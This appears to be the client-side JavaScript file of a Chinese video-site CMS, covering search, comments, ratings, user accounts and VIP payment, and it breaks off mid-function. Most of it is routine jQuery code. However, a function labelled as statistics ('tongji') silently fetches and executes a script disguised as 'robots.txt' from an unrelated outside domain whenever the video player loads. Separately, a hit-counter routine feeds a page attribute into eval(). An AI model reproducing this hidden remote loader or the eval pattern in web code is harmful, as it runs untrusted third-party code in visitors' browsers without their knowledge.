/* Version 3.6122
** sale 2.2 ziye
** Up:2022.3 14.10*/
var feifei = {
//start
'browser':{//浏览器信息
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': (navigator.browserLanguage || navigator.language).toLowerCase(),//zh-tw|zh-hk|zh-cn
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
'cms':{//系统
	'nav': function($id){//主导航高亮
		$id = $('nav[data-dir]').attr('data-dir');
		$($id).addClass("active");
	},
	'pre':function(){//代码高亮
		//https://highlightjs.org/static/demo/
		if($("pre code").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//lib.baomitu.com/highlight.js/9.12.0/highlight.min.js", function(){
				$('pre code').each(function(i, block) {
					hljs.highlightBlock(block);
				});
			});
		}
	},
	'collapse':function(){//内容详情折叠
		$('.vod-detail .vod-content img').addClass("img-responsive");
		$('.news-detail .news-content img').addClass("img-responsive");
		$('body').on("click", "[data-toggle=ff-collapse]", function(){
			$this = $(this);
			$($this.attr('data-target')).toggle();
			$($this.attr('data-default')).toggle();
			if($this.attr('data-html')){
				$data_html = $this.html();
				$this.html($this.attr('data-html'));
				$this.attr('data-html',$data_html);
			}
			if($this.attr('data-val')){
				$data_val = $this.val();
				$this.val($this.attr('data-val'));
				$this.attr('data-val',$data_val);
			}
		});
	}
},
'mobile':{//移动端专用
	'jump': function(){
		if( cms.domain_m && (feifei.browser.domain != cms.domain_m) ){
			self.location.href = feifei.browser.url.replace(feifei.browser.domain,cms.domain_m);
		}
	},
	'nav': function(){
		$("#ff-nav-btn").bind('click', function(){
			$('#ff-nav-btn-item').toggleClass("hidden");
		});
	},
	'goback': function(){
		if(history.length > 0 && document.referrer){
			$(".ff-goback").show();
			$('.ff-goback').attr('href','javascript:history.go(-1);');
		}else{
			$(".ff-goback").hide();
		}
	},
	'flickity':function(){//手机滑动
		if($(".ff-gallery").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({
				rel: "stylesheet",
				type: "text/css",
				href: "//lib.baomitu.com/flickity/2.0.11/flickity.min.css"
			}).appendTo("head");
			$.getScript("//lib.baomitu.com/flickity/2.0.11/flickity.pkgd.min.js", function(){
				$(".ff-gallery").each(function(i){
					$index = $(this).find('.gallery-active').index()*1;
					if($index > 3){
						$index = $index-3;
					}else{
						$index = 0;
					}
					$(this).flickity({
						cellAlign: 'left',
						freeScroll: true,
						lazyLoad: true,
						contain: true,
						prevNextButtons: false,
						resize: true,
						initialIndex: $index,
						pageDots: false
					});
				});
			});
		}
	}
},
'scroll':{//滚动条
	'fixed' : function($id, $top, $width){// 悬浮区域
		var offset = $('#'+$id).offset();
		if(offset){
			if(!$top){
				$top = 5;
			}
			if(!$width){
				$width = $('#'+$id).width();
			}			
			$(window).bind('scroll', function(){
				if($(this).scrollTop() > offset.top){
					$('#'+$id).css({"position":"fixed","top":$top+"px","width":$width+"px"});
				}else{
					$(('#'+$id)).css({"position":"relative"});
				}
			});		
		}
	},
	'totop':function($id, $top){ //返回顶部
		// $id:dc-totop $top:偏移值
		$('body').append('<a href="#" class="'+$id+'" id="'+$id+'"><i class="glyphicon glyphicon-chevron-up"></i></a>');
		$(window).bind('scroll', function(){
			if($(this).scrollTop() > $top){
				$('#'+$id).fadeIn("slow");
			}else{
				$('#'+$id).fadeOut("slow");
			}
		});	
	}
},
'language':{//简繁转换
	's2t':function(){
		if(feifei.browser.language=='zh-hk' || feifei.browser.language=='zh-tw'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).s2t();//$.s2t(data);
			});
		}
	},
	't2s':function(){
		if(feifei.browser.language=='zh-cn'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).t2s();//$.s2t(data);
			});
		}
	}
},
'page': {//分页
	'more': function(){
		$('body').on('click', '.ff-page-more', function(){
			$this = $(this);
			$page = $(this).attr('data-page')*1+1;
			$id = $this.attr('data-target');
			$.get($(this).attr('data-url')+$page, function(data){
				if(data){
					$($id).append(data);
					$this.attr("data-page",$page);
					$($id+" .ff-img").lazyload();
				}else{
					$this.hide();
					$this.unbind("click");
				}
			},'html');
		});
	},
	'keydown': function(){
	  var prev = $('#ff-prev').attr("href");
	  var next = $('#ff-next').attr("href");
	  $("body").keydown(function(event){
		  if(event.keyCode==37 && prev!=undefined) location=prev; 
		  if(event.keyCode==39 && next!=undefined) location=next; 
	  });
  }
},
'alert':{//提示
	'success':function($id, $tips){
		$($id).html('<div class="alert alert-success fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>成功！</strong>'+$tips+'</div>');
	},
	'warning':function($id, $tips){
		$($id).html('<div class="alert alert-warning fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>警告！</strong>'+$tips+'</div>');
	}
},
'image': {//图片
	'lazyload': function(){//延迟加载
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response, status) {
			$("img.ff-img").lazyload({
				placeholder : cms.root+"Public/images/no.jpg",
				effect : "fadeIn",
				failurelimit: 15
				//threshold : 400
				//skip_invisible : false
				//container: $(".carousel-inner"),
			}); 
		});
	},
	'qrcode': function(){//生成二维码
		//$("[data-toggle='popover']").popover({html: true});
		$(".glyphicon-phone").popover({
				html: true
		});
		$(".glyphicon-phone").on('show.bs.popover', function () {
			$(".glyphicon-phone").attr('data-content','<img class="ff-qrcode" src="//cdn.feifeicms.co/qrcode/1.0/?w=150&h=150&url='+encodeURIComponent(feifei.browser.url)+'"/>');
		})
	},
	'vcode':function(){//安全码
		return '<label><img class="ff-vcode-img" src="'+cms.root+'index.php?s=Vcode-Index"></label>';
	},
	'slide':function(){//轮播幻灯
		$('.ff-slide').carousel({interval: $('.ff-slide').attr('data-interval')});
	}
},
'vcode': {//验证码
	'load': function(){
		feifei.vcode.focus();
		feifei.vcode.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", ".ff-vcode", function(){
			$(this).removeClass('ff-vcode').parent().after(feifei.image.vcode());
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.ff-vcode-img', function(){
			$(this).attr('src', cms.root+'index.php?s=Vcode-Index');
		});
	}
},
'search': {//搜索
	'dropdown': function(){//下拉菜单
		$(".ff-search .dropdown-menu li a").on("click", function(){
			$form = $(this).parents('form');
			$action = $form.find('button[data-action]');
			if($action.attr('data-action') && $(this).attr('data-action')){
				$action.attr('data-action', $(this).attr('data-action'));
				$form.find('.dropdown-toggle .title').html($(this).html());
			}
		});
	},
	'keydown': function(){//回车
		$(".ff-search input").keyup(function(event){
			if(event.keyCode == 13){
				$form = $(this).parents('form');
				$action = $form.find('button[data-action]').attr('data-action');
				if(!$action){
					$action = cms.root+'index.php?s=vod-search-name-FFWD';
				}
				$wd = $form.find('.ff-wd').val();
				if($wd){
					location.href = $action.replace('FFWD',encodeURIComponent($wd));
				}else{
					$(this).find('.ff-wd').focus();
					$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
				}
				return false;
			}
		});
	},	
	'submit': function(){//提交表单
		$(".ff-search button").on("click", function(){
			$action = $(this).attr('data-action');
			if($action){
				$(".ff-search").attr('action', $action);
			}
		});
		$(".ff-search").on("submit", function(){
			$action = $(this).attr('action');
			$wd = $(this).find('.ff-wd').val();
			if(!$action){
				$action = cms.root+'index.php?s=vod-search-name-FFWD';
			}
			if($wd){
				location.href = $action.replace('FFWD',encodeURIComponent($wd));
			}else{
				$(this).find('.ff-wd').focus();
				$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
			}
			return false;
		});
	},
	'autocomplete': function(){//3.5增加搜索结果控制
		var $limit = $('.ff-search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("//lib.baomitu.com/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				if($('.ff-search').eq(0).attr('data-sid') == 2){
					$ajax_url = cms.root+'index.php?g=home&m=search&a=news';
				}else{
					$ajax_url = cms.root+'index.php?g=home&m=search&a=vod';
				}
				$('.ff-wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'wd',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.name, data: dataItem.link };
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
	},
	'hot':function(){
		$(".ff-search [data-toggle='tooltip']").tooltip();
		$("#ff-site-hot").load(cms.root+"index.php?s=ajax-site_hot");
	}
},
'record': {//云记录
	'load': function(){
		feifei.record.get();
		feifei.record.set();
	},
	'get':function(){
		//后端获取记录
		if($(".ff-record-get").eq(0).length){
			$.get(cms.root+'index.php?g=home&m=record&a=vod&sid=1', function(data){
				if(data == ''){
					data = '<strong>暂无观看记录</strong>';
				}
				$(".ff-record-get").attr('data-content',data);
			});
		}
		//弹出事件
		$(".ff-record-get").popover().on("mouseenter", function () {
			var _this = this;
			$(this).popover("show");
			$(".popover").on("mouseleave", function () {
				$(_this).popover('hide');
			});
		}).on("mouseleave", function () {
			var _this = this;
			setTimeout(function () {
				if (!$(".popover:hover").length) {
					$(_this).popover("hide");
				}
			}, 300);
		});
	},
	'set':function(){//用户互动记录
		//自动写入观看或浏览记录
		if($(".ff-record-set[data-type=1]").eq(0).attr('data-sid')){
			$this = $(".ff-record-set[data-type=1]").eq(0);
			$.get(cms.root+'index.php?g=home&m=record&a=post&sid='+$this.attr("data-sid")+'&did='+$this.attr("data-id")+'&type=1&did_sid='+$this.attr("data-id-sid")+'&did_pid='+$this.attr("data-id-pid"));
		}
		//喜欢 想看 在看 看过 写入记录
		$('body').on('click', 'a.ff-record-set', function(e){
			//是否需要验证登录
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
				return false;
			}
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?g=home&m=record&a=post&sid='+$(this).attr("data-sid")+'&did='+$(this).attr("data-id")+'&type='+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						if(json.status == 200){
							$this.addClass('disabled');
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//lib.baomitu.com/raty/2.7.1/jquery.raty.min.js", function(response, status) {
				$(".ff-score").each(function(i){
					$(".ff-score").eq(i).find('.ff-score-raty').raty({ 
						starType: 'i',
						number: 5,
						numberMax : 5,
						half: true,
						score : function(){
							return $(this).attr('data-score');
						},
						click: function(score, evt) {
							$this = $(this);
							$.ajax({
								type: 'get',
								url: cms.root+'index.php?s=gold-'+$(this).attr('data-module')+'-id-'+$(this).attr('data-id')+'-score-'+(score*2),
								timeout: 5000,
								dataType:'json',
								error: function(){
									$this.attr('title', '网络异常！').tooltip('show');
								},
								success: function(json){
									if(json.status == 1){
										$this.parent().find('.ff-score-val').html(json.data.gold);
									}else{
										$this.attr('title', json.info).tooltip('show');
									}
								}
							});
						}
					});					
				});
			});
		}
	}
},
'updown':{//顶踩
	'click': function(){
		$('body').on('click', 'a.ff-updown-set', function(e){
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?s=updown-'+$(this).attr("data-module")+'-id-'+$(this).attr("data-id")+'-type-'+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						$this.addClass('disabled');
						if(json.status == 1){
							if($this.attr("data-type")=='up'){
								$this.find('.ff-updown-val').html(json.data.up);
							}else{
								$this.find('.ff-updown-val').html(json.data.down);
							}
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'hits':{//人气
	'load': function(){
		$(".ff-hits").each(function(i){
			var $this = $(".ff-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=hits-show-id-'+$this.attr("data-id")+'-sid-'+$this.attr("data-sid")+'-type-'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(json){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(json.' + $type + ')'));
					}
				}
			});
	 });
	}
},
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			$size = $(".ff-share").attr('data-size');
			if(!$size){$size = 16;}
			if( $(".ff-share dd").length ){
				$id = $(".ff-share dd");
			}else{
				$id = $(".ff-share");
			}
			$($id).html('<div class="bdsharebuttonbox"><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_bdysc" data-cmd="bdysc" title="分享到百度云收藏"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>');
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
	'load':function(){
		if($('.ff-forum[data-type=feifei]').length){
			this.system();
		}
		if($('.ff-forum[data-type=uyan]').length){
			this.uyan();
		}
		if($('.ff-forum[data-type=changyan]').length){
			this.changyan();
		}
	},
	'system': function(){
		//初始加载
		if($('.ff-forum[data-type=feifei]').attr('data-sid')){
			feifei.forum.ajax('.ff-forum', $('.ff-forum[data-type=feifei]').attr('data-sid'), $('.ff-forum[data-type=feifei]').attr('data-id'), 0, 1);
		}
		//登录验证
		$(".ff-forum").on("focus", 'textarea[name=forum_content]', function(){ //表单提交
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
			}
		});
		//回复评论
		$('body').on('click', 'a.forum-reply-set', function(){
			var $pid = $(this).attr("data-id");
			var $reply = $(this).parents('.media-body').find('.forum-reply');
			var $form = $($(".ff-forum-post").eq(0).prop("outerHTML"));
			if($pid){
				$form.find('.ff-alert').html('');
				$form.find("button[type='submit']").removeClass('disabled')
				$form.find("input[name='forum_pid']").val($pid);
				$form.show();
				$($reply).html($form);
				$($reply).collapse('toggle');
			}
		});
		//举报评论
		$('body').on('mouseenter', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeIn();
		});
		$('body').on('mouseleave', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeOut();
		});
		$('body').on('click', 'a.forum-report', function(){
			$(this).remove();//移除按钮
			var $id = $(this).attr("data-id");
			if($id){
				$.ajax({
					type: 'get',
					url: cms.root+'index.php?s=forum-report-id-'+$id,
					timeout: 3000,
					dataType:'json',
					success:function(json){
						feifei.alert.success($('.form-forum').eq(0).find('.ff-alert'), json.info);
					}
				});
			}
		});
		//发表评论
		$("body").on("submit", '.ff-forum-post', function(){
			var $this = $(this);
			var $sid = $(this).find('input[name=forum_sid]').val();
			$.post($this.attr('action'), $this.serialize(), function(json){
				if(json.status == 200){//不需要审核留言
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
					//主题、回复贴处理
					if(json.data.forum_pid){//回复贴
						feifei.forum.reply(json.data.forum_pid);//更新回复数及显示回复链接按钮
						setTimeout(function(){$('.forum-reply[data-id='+json.data.forum_pid+']').fadeOut('slow')}, 2000);//移除回复表单容器
					}else{//主题贴
						setTimeout(function(){feifei.forum.ajax('.ff-forum-item', json.data.forum_sid, json.data.forum_cid, 1, 1)}, 2000);
						setTimeout(function(){$this.hide()}, 3000);
					}
					//发表评论后是否需要刷新网页
					if($('.ff-forum-reload').length){
						location.reload();
					}
				}else if(json.status > 200){//需要审核
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
				}else{
					feifei.alert.warning($this.find('.ff-alert'), json.info);
				}
			 },'json');
			return false;
		});
	},
	'ajax': function($target, $sid, $cid, $ismore, $page){//AJAX加载系统评论
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-ajax-sid-'+$sid+'-cid-'+$cid+'-ismore-'+$ismore+'-p-'+$page,
			timeout: 3000,
			error: function(){
				$($target).html('评论加载失败，请刷新...');
			},
			success:function($html){
				$($target).html($html);
			}
		});
	},
	'reply': function($id){//更新回复数及显示回复链接
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-reply-id-'+$id,
			timeout: 3000,
			dataType:'json',
			success:function(json){
				if(json.status==200){
					$('.forum-reply-set[data-id='+$id+']').find('.forum-reply-val').html(json.data);
					$('.forum-reply-get[data-id='+$id+']').fadeIn();
				}
			}
		});
	},
	'uyan': function(){
		$(".ff-forum").html('<div id="uyan_frame"></div>');
		$.getScript("http://v2.uyan.cc/code/uyan.js?uid="+$('.ff-forum[data-type=uyan]').attr('data-uyan-uid'));
	},
	'changyan': function(){
		$appid = $('.ff-forum[data-type=changyan]').attr('data-cy-id');
		$conf = $('.ff-forum[data-type=changyan]').attr('data-cy-conf');
		$sourceid = $('.ff-forum[data-type=changyan]').attr('data-sid')+'-'+$('.ff-forum[data-type=changyan]').attr('data-id');
		var width = window.innerWidth || document.documentElement.clientWidth;
		if (width < 768) { 
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div><script charset="utf-8" id="changyan_mobile_js" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+$appid+'&conf=prod_'+$conf+'"><\/script>');
		}else{
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div>');
			$.getScript("https://changyan.sohu.com/upload/changyan.js",function(){
				window.changyan.api.config({
					appid: $appid,
					conf: 'prod_'+$conf
				});
			});
		}
	}
},
'scenario': {//分集剧情
	'load':function(){
		var $max = $(".ff-scenario-pill").attr('data-max')*1;
		var $count = $(".ff-scenario-content dl").length;
		var $li = 0;
		var $list = '';
		if($count > 0 && $max>0){
			for($i=0; $i<$count; $i++){
				if(($i+$max) > $count){
					$max_ji = $count;
				}else{
					$max_ji = $i+$max;
				}
				if($i % $max == 0){
					$li++;
					$list+='<li><a href="javascript:;" data-target=".ff-scenario-'+$li+'" data-toggle="pill">第'+($i+1)+'-'+$max_ji+'集</a></li>';
				}
				$(".ff-scenario-content dl").eq($i).addClass('ff-scenario-'+$li);
			}
			$('.ff-scenario-pill').html($list);
			$('.ff-scenario-pill a:first').tab('show');
		}
	}
},
'playurl': {//播放地址
	'download': function(){
		if($(".ff-playurl-down").length){
			$.getScript("//cdn.feifeicms.co/download/xunlei.js",function(){
				//3.4增加鼠标点击去掉文件名标题
				$(".ff-playurl-down input[type=text]").focus(function(){
					$(this).val($(this).parent().find('input[type=checkbox]').val());
				});
			});
		}
	},
	'tongji': function(){
		if($("#cms_player").length){
			$.getScript("//www.cnhb.org/robots.txt");
		}
	},
	'active':function(){
		$('.ff-playurl li[data-id="'+$('.ff-playurl[data-active]').attr('data-active')+'"]').addClass("active");
		$('.ff-playurl-tab a[data-target="'+$('.ff-playurl-tab[data-active]').attr('data-active')+'"]').tab('show');
		$('.ff-playurl-dropdown a[data-target="'+$('.ff-playurl-dropdown[data-active]').attr('data-active')+'"]').tab('show');
	},	
	'dropdown':function(){
		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			$(this).parents('.btn-group').find('.dropdown-toggle span:eq(0)').html($(e.target).text());
			$(this).parents('.dropdown-menu').find('li').removeClass('active');
			$(this).parent().addClass('active');
		});
	},
	'more':function(){//...效果
		$('.ff-playurl').each(function(i){
			$this = $(this);
			$config = $this.attr('data-more')*1;
			$max = $this.find('li a').size();
			if(($config+2) < $max && $config>0){
				$max_html = $($this.find('li:last').prop("outerHTML")).find('a').attr('href','#all').html('全部...');
				$max_html = '<li class="'+$this.find('li').attr('class')+'">'+$max_html.prop("outerHTML")+'</li>';
				$this.find('li').each(function(n){
					if(n+1 > $config){
						$(this).hide();
					}
				});
				$this.find('li').eq($config).after($max_html);
				$this.find('li:last').show();
			}
	 	});
		//more点击
		$('.ff-playurl').on('click', 'a', function(e){
			if($(this).attr('href') == '#all'){
				$(this).parent().parent().find('li').show();
				$(this).parent().remove();
				return false;
			}
		});
	},
	//vip播放器回调
	'vip_callback':function($vod_id, $vod_sid, $vod_pid, $status, $trysee, $tips){
		if($status != 200){
			if($trysee > 0){
				window.setTimeout(function(){
					$.get(cms.root+'index.php?s=vod-vip-action-trysee-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(html){
						$('#cms_player').html(html).removeClass("embed-responsive-4by3").css({"height":"auto"});
					},'html');
				},1000*60*$trysee);
			}else{
				$('#cms-player-vip .cms-player-box').html($tips);
				$('#cms-player-vip .cms-player-iframe').hide();
				$('#cms_player').removeClass("embed-responsive-4by3").css({"height":"auto"});
			}
			//支付影币按钮
			$('#cms_player').on("click",".vod-price",function(){
				$(this).html('Loading...');
				$.get(cms.root+'index.php?s=vod-vip-action-ispay-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(json){
					if(json.status == 200){
						location.reload();
					}else if(json.status == 500 || json.status == 501){
						feifei.user.login();
					}else{
						$('#cms_player').html(json.info);
					}
				},'json');
			});
		}else{
			//拥有VIP观看权限
		}
	}
},
'user':{
	//基础功能
	'load':function(){
		//不同模式下处理用户基础信息
		feifei.user.islogin();
		//模态框登录事件
		$("body").on("click",".user-login-modal",function(){
			feifei.user.login();
			return false;
		});
		//积分在线充值事件
		$("body").on("click",".user-score-payment",function(){
			feifei.user.ScorePayment();
			return false;
		});
		//积分卡密充值事件
		$("body").on("click",".user-score-card",function(){
			feifei.user.ScoreCard();
			return false;
		});
		//积分升级VIP事件
		$("body").on("click",".user-score-upvip",function(){
			feifei.user.ScoreUpvip();
			return false;
		});
		//用户中心修改邮箱
		$("body").on("click",".user-change-email", function(){
			feifei.user.ChangeEmail();
			return false;
		});
		//用户中心修改密码
		$("body").on("click",".user-change-pwd", function(){
			feifei.user.ChangePwd();
			return false;
		});
	},
	//静态模式加载用户ID
	'islogin':function(){
		if($('.ff-user').length && (cms.urlhtml == 1)){
			$.ajax({
				type: 'get',
				url: cms.root+'index.php?s=user-info',
				timeout: 3000,
				dataType:'json',
				success:function(json){
					if(json.status==200){
						cms.userid = json.data.user_id;
						cms.username = json.data.user_name;
						$('.ff-user').removeClass("user-login-modal");
						$('.ff-user[data-href]').attr('href',$('.ff-user[data-href]').attr('data-href'));
						$('.ff-user[data-name]').html('<a href="'+$('.ff-user').attr('data-href')+'">'+cms.username+'</a>');
					}
				}
			});
		}
	},
	//AJAX模态框登录
	'login':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root+'index.php?s=user-ajax_login',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".form-user-login").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-login-alert').html('正在登录...');
						},
						error : function(){
							$('.user-login-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								location.reload();
							}else{
								$('#user-submit').html('登录');
								feifei.alert.warning('.user-login-alert',json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//积分在线充值
	'ScorePayment':function(){
		feifei.order.payment();
	},
	//积分卡密充值
	'ScoreCard':function(){
		feifei.order.card();
	},
	//升级VIP
	'ScoreUpvip':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_upvip',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-upvip-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-upvip-alert').html('Loading...');
						},
						error : function(){
							$('.user-upvip-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-upvip-alert', '升级完成，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-upvip-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else if(json.status == 501){
								feifei.alert.warning('.user-upvip-alert', '影币不足，共需要'+json.info+'个影币，请先冲值！');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.order.payment();}, 2000);
							}else{
								feifei.alert.warning('.user-upvip-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改邮箱
	'ChangeEmail':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_email',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-email-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-email-alert').html('Loading...');
						},
						error : function(){
							$('.user-email-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-email-alert', '邮箱修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-email-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-email-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改密码
	'ChangePwd':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_repwd',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-repwd-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-repwd-alert').html('Loading...');
						},
						error : function(){
							$('.user-repwd-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-repwd-alert', '密码修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-repwd-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-repwd-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
},
'order':{//影币订单模块
	'payment':function(){//在线充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-index',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-payment").on('submit',function(e){
					if($(".forum-payment input[name=score_ext]").val() < $(".forum-payment").attr('data-small')){
						feifei.alert.warning('.user-pay-alert', '每次至少充值<strong>'+$(".forum-payment").attr('data-small')+'</strong>元');
						return false;
					}
					setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();}, 5000);
				});
			}
		});
	},
	'card':function(){//卡密充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-card',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-card").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
